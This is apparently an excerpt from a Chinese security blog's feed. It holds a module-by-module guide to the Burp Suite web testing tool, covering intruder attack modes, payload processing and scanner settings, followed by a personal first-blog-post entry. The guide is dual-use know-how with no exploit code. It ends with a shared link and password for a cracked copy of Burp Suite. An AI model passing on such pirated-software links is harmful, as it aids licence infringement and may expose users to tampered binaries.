    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>描述：Burp Suite 是用于攻击web 应用程序的集成平台。平台中所有工具共享同一robust框架，以便统一处理HTTP请求、持久性、认证、上游代理、日志记录、报警和可扩展性。<a id="more"></a>Burp Suite允许攻击者结合手工和自动技术去枚举、分析、攻击Web应用程序。具体作用如：HTTP服务端接口测试；HTTP客户端和服务器端通信测试；Cookie统计分析；WEB页面爬取；WEB常用编码和解码；字符串随机性简单分析；差异对比分析。 </p><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>options： 对整个burpsuite管理，可选择记录日志。<br>comparer：对比。从其他模块转入，用words或者bytes做对比。<br>decoder：编码。encode as 编码，decode as 解码。smart decode 自动分析解码。<br>sequencer：分析字符的随机性，如分析cookie<br>reperater：重放<br>intruder：攻击<br>scanner：扫描<br>spider：爬虫<br>proxy：核心<br>target：为spider和scanner模块设置目标 设置分析域，site map 网站结构，图。<br>alerts：为burpsuite报错，输出错误日志 </p><h2 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h2><p>Proxy功能： http代理功能，处理http请求，处理http响应。<br>intercept：拦截<br>history：历史<br>options：设置&gt;&gt;proxy listeners 设置代理 （intercept client request：对客户端的请求做拦截 intercept server responses：对服务端的回复做拦截，默认不做拦截，需自己打勾）<br>response modification：修改返回值<br>match and replace：若发现请求或应答中某些字符符合你设置的字符则可以删除或修改。<br>miscellaneous：其他。<br>intercept： forward：放过，drop 丢弃， intercept is off 不做拦截。<br>history 单击下面方框可设置过滤器。<br>interface： 当本地端口已被占用，使用proxy中的options中的proxy listener更改端口，也可以在proxy listener 中设置其他主机的IP与端口进行监听<br>Redirect：请求处理，更改包的访问地址与端口。可以选择是否用ssl加密发送。当使用ssl时只有网站采用ssl的部分才能得到回应。<br>invisible：代理的标准即设置了代理与未设置代理请求包的区别。<br>certificate：证书。三个选项。下面是可以自己导入证书。 </p><h2 id="Repeater-（老式步枪，一次一发）"><a href="#Repeater-（老式步枪，一次一发）" class="headerlink" title="Repeater （老式步枪，一次一发）"></a>Repeater （老式步枪，一次一发）</h2><p>先通过proxy抓包，然后将包发送到repeater 可以通过重放修改包头信息。 repeater设置项在最上方，可设置更新长度，解压，如果对方选择跳转是否跟随。跟踪cookies，菜单栏。在右上角有一个target可以设置发送主机与端口。use HTTPS 是可以将http转换成https，如转至访问支付宝。<br>** Intruder （冲锋枪，可连发）<br>最上方设置项：开始攻击，打开保存过的攻击，保存攻击配置（保存payload配置），拷贝/下载攻击配置，new tab behavior 新建窗口（），自动攻击点，加载数据（可使用buit-in lists 也可以打开自己的攻击文本）<br>options：（设置–攻击频率，修改数据）与repeater右上角target差不多。<br>Targer（目标）：</p><h2 id="positions-（攻击点，参数）"><a href="#positions-（攻击点，参数）" class="headerlink" title="positions （攻击点，参数）"></a>positions （攻击点，参数）</h2><p>Clear$：关掉所有标记的攻击点，选中想要攻击的参数选择add$，或者过长的参数选择开始点add然后在参数结尾再选择一次add。<br>payload（攻击类型的选择即子弹选择）：<br>1、sniper：狙击，对一个参数进行攻击 payload type，可以选择参数内容。对于每一个攻击点用存在的攻击内容依次抡一遍<br>2、battering ram：对多个参数进行同一种攻击<br>3、pitchfork：叉子模式，可自行设置攻击点的攻击内容。保证每个攻击点的payload数量相同，否则选用最少攻击次数<br>4、cluster bomb：设置相似pitchfork，必须为每个攻击点设置payload，攻击次数是每个参数的payload相互组合发送攻击，次数最多 </p><h2 id="payload-攻击集合）"><a href="#payload-攻击集合）" class="headerlink" title="payload (攻击集合）"></a>payload (攻击集合）</h2><p>payload sets 设置集合个数，即选择几个攻击点，type几种攻击类型=子弹种类：数字、simple list（内置的攻击行在payload option中选择如xss） 等等，也就是字典生成器<br>runtime file 选择大型字典 numbers 数字字典，可用于order by、union联合查询、brute forcer 暴力破解，输入的字符按位数自动排列进行暴力破解）<br>payload option 展示字典内容<br>payload processing 对你的字典进行处理，强化字典。（增加内容add prefix/suffix 增加前后缀，match/replace替换字典中的某些字符，substring 当字典中每个字符串过长，可以截取字符串中某几个字符，reverse substring 截取中间几个字符倒一下顺序，modify case 大小写的转换，Encode 编码【常用】）<br>payload encoding 为字典进行编码。等于 Encode 为快速选用而设计。 </p><h2 id="options-设置项"><a href="#options-设置项" class="headerlink" title="options (设置项)"></a>options (设置项)</h2><p>Request Headers：当服务器不支持长链接或者不想造成长链接可勾选 set connection：close<br>update content-length header： 计算包长度<br>request engine：n（时间上的设置，频率）umber of threads 线程数<br>number of retries on network failure 连接失败后 重新连接次数<br>pause before retry（millisecond） 每个包之间的时间间隔<br>throttle 发包时间设置，start time 点击开始攻击按钮后的启动时间，immediate 马上攻击<br>in__ minutes 自己设置时间<br>Attack results （攻击结果的记录）：store requests 从下请求，store respond 从下返回，make unmodified<br>baseline request 发送一次正常页面判断对方是否正常，使用dos攻击，压力测试，不记录返回结果。store<br>full payload 是否保存所有数据<br>Grep-match：添加搜索值，打勾后若返回数据中存在预选值则会被划钩 ；case sensitive match 判断区分大小写是否敏感；exclude http headers 检索不包括包头中的数据<br>Grep-extract：对上面检索的一个扩展，打开add 可以设置偏移量，能提取你想看的从某个位置到另一个位置中间的值。<br>Grep-payloads：判断提交值 在返回值中是否存在提交的值–对XSS很重要；判断大小写是否敏感；不包括http头；编码URL Redirection 如果对放返回一个需要跳转的请求，设置是否跳转过去</p><h2 id="Scanner-扫描模块"><a href="#Scanner-扫描模块" class="headerlink" title="Scanner (扫描模块)"></a>Scanner (扫描模块)</h2><p>results：扫描结果，有漏洞描述，修复方式<br>scan queue：扫描队列，扫描进程<br>live scanning：正在进行的扫描，live active scanning 主动扫描，主动提交数据，然后根据返回值分析得出漏洞。passive scanning 分析在扫描历史中的数据。默认打开，<br>options： 扫描设置 attack insertion points：URL参数更改，url，body，cookie三者的位置关系。可排除的攻击参数（缩小工作量），active scanning areas 动态扫描区域（采用payload类型）；passive scanning areas 静态扫描区域 </p><h2 id="Options-整体配置"><a href="#Options-整体配置" class="headerlink" title="Options (整体配置)"></a>Options (整体配置)</h2><p>misc : 其他<br>hotkeys 设置快捷键；<br>logging 日志（日志信息可以传给其他工具当做输入使用）；<br>temporary files location 临时文件目录，自动备份。<br>scheduled tasks 自己设置定时任务，如扫描，爬行等。<br>display： user interface 字体大小与风格，Http Message display 对http 信息的数据的设置 character sets 编码，解码方式。<br>html rendeing  html渲染。<br>connections 链接<br>platform authentication 提供登录页面，当有账号与密码时可用用来爬取登录页面<br>upstream proxy server 用外网某地址做代理。走http的<br>socks proxy 走socks代理服务器<br>timeout 整个软件的时间设置<br>hostname resolution 以burp suite做一个dns服务器 用于本地host更改后转发数据。<br>out_of_scope requests 处理没在域内的访问<br>http 整个软件所有与http有关的选项都遵循这边的设置。<br>redirections 是否跳转，哪些跳转<br>streaming response 进行长连接，设置长时间的代理。自己加 status 100 response 处理100返回值当需要post一个大的数据包时会先发送一个100的问候，当服务端返回100后才开始发送大数据包。<br>ssl–设置ssl属性<br>client ssl certificate：当取得某网站证书，可在此处使用证书。当访问一个存在ssl加密的网址时将证书存放在server SSL certificate (证书列）中.<br>ssl negotiation：进行协议的选择<br>sessions：保存sessions信息 </p><h2 id="spider-爬虫"><a href="#spider-爬虫" class="headerlink" title="spider (爬虫)"></a>spider (爬虫)</h2><p>options： crawler setting 设置爬找哪些东西。<br>form submission 自动匹配爬取到的数据。<br>request headers 设置爬虫头。<br>control 爬虫范围</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>burpsuite可以说是WEB测试必备神器之一，功能强大。其他介绍可以参考：<br><a href="http://www.nxadmin.com/tools/689.html" target="_blank" rel="external">http://www.nxadmin.com/tools/689.html</a><br><a href="https://portswigger.net/burp/download.html" target="_blank" rel="external">https://portswigger.net/burp/download.html</a><br>..</p><p>另外，分享一个我手中最新破解版的burpsuit–1.7.08：<br><a href="http://pan.baidu.com/s/1dFsU0JR" target="_blank" rel="external">http://pan.baidu.com/s/1dFsU0JR</a>     <br> 密码：l3nl</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;描述：Burp Suite 是用于攻击web 应用程序的集成平台。平台中所有工具共享同一robust框架，以便统一处理HTTP请求、持久性、认证、上游代理、日志记录、报警和可扩展性。
    
    </summary>
    
      <category term="神器" scheme="http://sunu11.com/categories/%E7%A5%9E%E5%99%A8/"/>
    
    
      <category term="Burpsuite" scheme="http://sunu11.com/tags/Burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>太初</title>
    <link href="http://sunu11.com/2016/10/08/1/"/>
    <id>http://sunu11.com/2016/10/08/1/</id>
    <published>2016-10-08T01:44:41.000Z</published>
    <updated>2016-11-28T15:32:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>不知道为啥，在写第一篇博文的时候突然想起小学老师教写日记的情景，几度春秋弹指即逝。。。。。。<a id="more"></a>唯一不变的还是这么<strong>low</strong>~~~ </p><h2 id="日常"><a href="#日常" class="headerlink" title="日常"></a>日常</h2><p>平常游荡在各位大佬，师傅，表哥的博客。在其中取经，学习，虽然没有评论，但是发自内心的佩服与感谢。在看完&lt;&lt;<a href="http://mindhacks.cn/2011/11/04/how-to-interview-a-person-for-two-years/" target="_blank" rel="external">怎样花两年时间去面试一个人</a>&gt;&gt;和Gabriel Weinberg的博文<a href="http://ye.gg//blog/2011/08/why-i-blog.html/" target="_blank" rel="external">《Why I blog》</a>之后，内心就萌发了创建个人博客的冲动，再加上平常笔记比较松散，不方便查阅，有时候遇到问题，解决后几天还有印象，但是时间一长，又忘了，也许下一次遇到同样的问题，又得浪费时间。想起<strong><em>黑客信条</em>：世界充满了待解决的迷人问题。一个问题不应该被解决两次。无聊和乏味的工作是罪恶。自由万岁。态度不能替代能力。</strong>越发觉得自己也有必要按时整理笔记，并记录在博客中。于己于人都是一件长久有益的事情。这个博客在八月份就已经搭建并备案完毕，还是挺感谢<a href="http://dbqf.xyz/" target="_blank" rel="external">清风</a>和<a href="http://www.monburan.cn/" target="_blank" rel="external">monburan</a>的，还有<a href="http://www.blovb.com" target="_blank" rel="external">黑鸟</a>，建站经历网上很多人都总结出来了，我就不再累赘了。 </p><h2 id="愿景"><a href="#愿景" class="headerlink" title="愿景"></a>愿景</h2><p>先把一些已经记录的笔记发出来，之后就整理学习过程中的收获与猥琐经验以及其他资源。希望能坚持下去，越走越远，，，，THE END –<br>To follow the path: (沿着这样一条道路：)<br>Look to the master, (寻找大师，)<br>Follow the master, (跟随大师，)<br>Walk with the master, (与大师通行，)<br>See through the master, (洞察大师，)<br>Become the master. (成为大师。) </p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;headerlink&quot; title=&quot;开始&quot;&gt;&lt;/a&gt;开始&lt;/h2&gt;&lt;p&gt;不知道为啥，在写第一篇博文的时候突然想起小学老师教写日记的情景，几度春秋弹指即逝。。。。。。
    
    </summary>
    
      <category term="岁月" scheme="http://sunu11.com/categories/%E5%B2%81%E6%9C%88/"/>
    
    
      <category term="生活" scheme="http://sunu11.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
</feed>
